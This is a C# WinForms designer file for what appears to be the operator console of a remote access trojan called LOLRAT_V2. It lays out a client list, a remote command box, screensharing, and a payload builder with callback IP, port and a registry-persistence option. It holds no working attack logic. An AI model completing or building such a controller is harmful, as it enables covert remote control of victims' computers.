namespace LOLRAT_V2
{
    partial class Form1
    {
        /// <summary>
        ///  Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///  Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        ///  Required method for Designer support - do not modify
        ///  the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            txtLog = new RichTextBox();
            txtCommand = new TextBox();
            btnExecute = new Button();
            comboBoxClients = new ComboBox();
            btnExecuteScript = new Button();
            tabControl = new TabControl();
            tabPageAdvanced = new TabPage();
            btnScreensharing = new Button();
            tabPageSimple = new TabPage();
            tabPageBuilder = new TabPage();
            groupBox = new GroupBox();
            checkBoxRegistry = new CheckBox();
            btnBuildPayload = new Button();
            label3 = new Label();
            txtPort = new TextBox();
            label2 = new Label();
            label1 = new Label();
            txtIP = new TextBox();
            tabControl.SuspendLayout();
            tabPageAdvanced.SuspendLayout();
            tabPageBuilder.SuspendLayout();
            groupBox.SuspendLayout();
            SuspendLayout();
            // 
            // txtLog
            // 
            txtLog.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            txtLog.Location = new Point(9, 48);
            txtLog.Margin = new Padding(3, 4, 3, 4);
            txtLog.Name = "txtLog";
            txtLog.Size = new Size(886, 464);
            txtLog.TabIndex = 0;
            txtLog.Text = "";
            // 
            // txtCommand
            // 
            txtCommand.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            txtCommand.Location = new Point(9, 521);
            txtCommand.Margin = new Padding(3, 4, 3, 4);
            txtCommand.Name = "txtCommand";
            txtCommand.Size = new Size(765, 27);
            txtCommand.TabIndex = 1;
            txtCommand.Text = "whoami";
            // 
            // btnExecute
            // 
            btnExecute.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            btnExecute.Location = new Point(782, 521);
            btnExecute.Margin = new Padding(3, 4, 3, 4);
            btnExecute.Name = "btnExecute";
            btnExecute.Size = new Size(114, 31);
            btnExecute.TabIndex = 2;
            btnExecute.Text = "EXECUTE";
            btnExecute.UseVisualStyleBackColor = true;
            btnExecute.Click += btnExecute_Click;
            // 
            // comboBoxClients
            // 
            comboBoxClients.FormattingEnabled = true;
            comboBoxClients.Location = new Point(9, 9);
            comboBoxClients.Margin = new Padding(3, 4, 3, 4);
            comboBoxClients.Name = "comboBoxClients";
            comboBoxClients.Size = new Size(156, 28);
            comboBoxClients.TabIndex = 3;
            // 
            // btnExecuteScript
            // 
            btnExecuteScript.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            btnExecuteScript.Location = new Point(771, 8);
            btnExecuteScript.Margin = new Padding(3, 4, 3, 4);
            btnExecuteScript.Name = "btnExecuteScript";
            btnExecuteScript.Size = new Size(127, 31);
            btnExecuteScript.TabIndex = 4;
            btnExecuteScript.Text = "Execute Script";
            btnExecuteScript.UseVisualStyleBackColor = true;
            btnExecuteScript.Click += btnExecuteScript_Click;
            // 
            // tabControl
            // 
            tabControl.Controls.Add(tabPageAdvanced);
            tabControl.Controls.Add(tabPageSimple);
            tabControl.Controls.Add(tabPageBuilder);
            tabControl.Dock = DockStyle.Fill;
            tabControl.Location = new Point(0, 0);
            tabControl.Margin = new Padding(3, 4, 3, 4);
            tabControl.Name = "tabControl";
            tabControl.SelectedIndex = 0;
            tabControl.Size = new Size(914, 600);
            tabControl.TabIndex = 5;
            // 
            // tabPageAdvanced
            // 
            tabPageAdvanced.Controls.Add(btnScreensharing);
            tabPageAdvanced.Controls.Add(txtLog);
            tabPageAdvanced.Controls.Add(btnExecute);
            tabPageAdvanced.Controls.Add(btnExecuteScript);
            tabPageAdvanced.Controls.Add(txtCommand);
            tabPageAdvanced.Controls.Add(comboBoxClients);
            tabPageAdvanced.Location = new Point(4, 29);
            tabPageAdvanced.Margin = new Padding(3, 4, 3, 4);
            tabPageAdvanced.Name = "tabPageAdvanced";
            tabPageAdvanced.Padding = new Padding(3, 4, 3, 4);
            tabPageAdvanced.Size = new Size(906, 567);
            tabPageAdvanced.TabIndex = 0;
            tabPageAdvanced.Text = "Advanced";
            tabPageAdvanced.UseVisualStyleBackColor = true;
            // 
            // btnScreensharing
            // 
            btnScreensharing.Location = new Point(638, 9);
            btnScreensharing.Margin = new Padding(3, 4, 3, 4);
            btnScreensharing.Name = "btnScreensharing";
            btnScreensharing.Size = new Size(127, 31);
            btnScreensharing.TabIndex = 5;
            btnScreensharing.Text = "Screensharing";
            btnScreensharing.UseVisualStyleBackColor = true;
            btnScreensharing.Click += btnScreensharing_Click;
            // 
            // tabPageSimple
            // 
            tabPageSimple.Location = new Point(4, 29);
            tabPageSimple.Margin = new Padding(3, 4, 3, 4);
            tabPageSimple.Name = "tabPageSimple";
            tabPageSimple.Padding = new Padding(3, 4, 3, 4);
            tabPageSimple.Size = new Size(906, 567);
            tabPageSimple.TabIndex = 1;
            tabPageSimple.Text = "Simple";
            tabPageSimple.UseVisualStyleBackColor = true;
            // 
            // tabPageBuilder
            // 
            tabPageBuilder.Controls.Add(groupBox);
            tabPageBuilder.Controls.Add(btnBuildPayload);
            tabPageBuilder.Controls.Add(label3);
            tabPageBuilder.Controls.Add(txtPort);
            tabPageBuilder.Controls.Add(label2);
            tabPageBuilder.Controls.Add(label1);
            tabPageBuilder.Controls.Add(txtIP);
            tabPageBuilder.Location = new Point(4, 29);
            tabPageBuilder.Margin = new Padding(3, 4, 3, 4);
            tabPageBuilder.Name = "tabPageBuilder";
            tabPageBuilder.Size = new Size(906, 567);
            tabPageBuilder.TabIndex = 2;
            tabPageBuilder.Text = "Builder";
            tabPageBuilder.UseVisualStyleBackColor = true;
            // 
            // groupBox
            // 
            groupBox.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            groupBox.Controls.Add(checkBoxRegistry);
            groupBox.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            groupBox.Location = new Point(481, 124);
            groupBox.Margin = new Padding(3, 4, 3, 4);
            groupBox.Name = "groupBox";
            groupBox.Padding = new Padding(3, 4, 3, 4);
            groupBox.Size = new Size(394, 213);
            groupBox.TabIndex = 7;
            groupBox.TabStop = false;
            groupBox.Text = "Settings";
            // 
            // checkBoxRegistry
            // 
            checkBoxRegistry.AutoSize = true;
            checkBoxRegistry.Font = new Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point, 0);
            checkBoxRegistry.Location = new Point(19, 35);
            checkBoxRegistry.Margin = new Padding(3, 4, 3, 4);
            checkBoxRegistry.Name = "checkBoxRegistry";
            checkBoxRegistry.Size = new Size(204, 32);
            checkBoxRegistry.TabIndex = 6;
            checkBoxRegistry.Text = "Registry Persistence";
            checkBoxRegistry.UseVisualStyleBackColor = true;
            // 
            // btnBuildPayload
            // 
            btnBuildPayload.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            btnBuildPayload.Font = new Font("Segoe UI", 36F, FontStyle.Regular, GraphicsUnit.Point, 0);
            btnBuildPayload.Location = new Point(29, 375);
            btnBuildPayload.Margin = new Padding(3, 4, 3, 4);
            btnBuildPayload.Name = "btnBuildPayload";
            btnBuildPayload.Size = new Size(847, 177);
            btnBuildPayload.TabIndex = 5;
            btnBuildPayload.Text = "BUILD";
            btnBuildPayload.UseVisualStyleBackColor = true;
            btnBuildPayload.Click += btnBuildPayload_Click;
            // 
            // label3
            // 
            label3.AutoSize = true;
            label3.Font = new Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point, 0);
            label3.Location = new Point(29, 233);
            label3.Name = "label3";
            label3.Size = new Size(52, 28);
            label3.TabIndex = 4;
            label3.Text = "Port:";
            // 
            // txtPort
            // 
            txtPort.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            txtPort.Font = new Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point, 0);
            txtPort.Location = new Point(29, 265);
            txtPort.Margin = new Padding(3, 4, 3, 4);
            txtPort.Name = "txtPort";
            txtPort.Size = new Size(445, 34);
            txtPort.TabIndex = 3;
            txtPort.Text = "1337";
            // 
            // label2
            // 
            label2.AutoSize = true;
            label2.Font = new Font("Segoe UI", 24F, FontStyle.Regular, GraphicsUnit.Point, 0);
            label2.Location = new Point(29, 27);
            label2.Name = "label2";
            label2.Size = new Size(485, 54);
            label2.TabIndex = 2;
            label2.Text = "Payload Creation Settings:";
            // 
            // label1
            // 
            label1.AutoSize = true;
            label1.Font = new Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point, 0);
            label1.Location = new Point(29, 124);
            label1.Name = "label1";
            label1.Size = new Size(90, 28);
            label1.TabIndex = 1;
            label1.Text = "IP / DNS:";
            // 
            // txtIP
            // 
            txtIP.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
            txtIP.Font = new Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point, 0);
            txtIP.Location = new Point(29, 156);
            txtIP.Margin = new Padding(3, 4, 3, 4);
            txtIP.Name = "txtIP";
            txtIP.Size = new Size(445, 34);
            txtIP.TabIndex = 0;
            txtIP.Text = "127.0.0.1";
            // 
            // Form1
            // 
            AutoScaleDimensions = new SizeF(8F, 20F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(914, 600);
            Controls.Add(tabControl);
            Margin = new Padding(3, 4, 3, 4);
            Name = "Form1";
            Text = "Form1";
            FormClosing += Form1_FormClosing;
            tabControl.ResumeLayout(false);
            tabPageAdvanced.ResumeLayout(false);
            tabPageAdvanced.PerformLayout();
            tabPageBuilder.ResumeLayout(false);
            tabPageBuilder.PerformLayout();
            groupBox.ResumeLayout(false);
            groupBox.PerformLayout();
            ResumeLayout(false);
        }

        #endregion

        private RichTextBox txtLog;
        private TextBox txtCommand;
        private Button btnExecute;
        private ComboBox comboBoxClients;
        private Button btnExecuteScript;
        private TabControl tabControl;
        private TabPage tabPageAdvanced;
        private TabPage tabPageSimple;
        private TabPage tabPageBuilder;
        private GroupBox groupBox;
        private CheckBox checkBoxRegistry;
        private Button btnBuildPayload;
        private Label label3;
        private TextBox txtPort;
        private Label label2;
        private Label label1;
        private TextBox txtIP;
        private Button btnScreensharing;
    }
}
